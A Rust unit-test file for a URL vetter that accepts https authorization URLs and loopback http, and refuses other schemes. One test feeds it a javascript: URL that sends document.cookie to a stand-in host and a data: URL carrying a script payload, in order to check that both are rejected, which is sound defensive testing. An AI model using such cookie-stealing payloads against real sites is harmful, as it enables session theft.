use super::*;

#[test]
fn an_https_sign_in_page_passes() {
    assert_eq!(
        vet_authorization_url("https://auth.example.com/authorize?state=s"),
        Ok(())
    );
}

#[test]
fn http_passes_only_on_loopback() {
    assert_eq!(
        vet_authorization_url("http://127.0.0.1:8790/authorize"),
        Ok(())
    );
    assert_eq!(
        vet_authorization_url("http://localhost:8790/authorize"),
        Ok(())
    );
    assert_eq!(vet_authorization_url("http://[::1]:8790/authorize"), Ok(()));
    assert_eq!(
        vet_authorization_url("http://auth.example.com/authorize"),
        Err(UnsafeAuthorizationUrl {
            scheme: "http".to_owned()
        })
    );
}

#[test]
fn script_and_data_urls_are_refused() {
    assert_eq!(
        vet_authorization_url("javascript:fetch('//x/'+document.cookie)//?state=s"),
        Err(UnsafeAuthorizationUrl {
            scheme: "javascript".to_owned()
        })
    );
    assert_eq!(
        vet_authorization_url("data:text/html,<script>alert(1)</script>"),
        Err(UnsafeAuthorizationUrl {
            scheme: "data".to_owned()
        })
    );
}

#[test]
fn an_unparseable_url_is_refused() {
    assert!(vet_authorization_url("not a url").is_err());
}
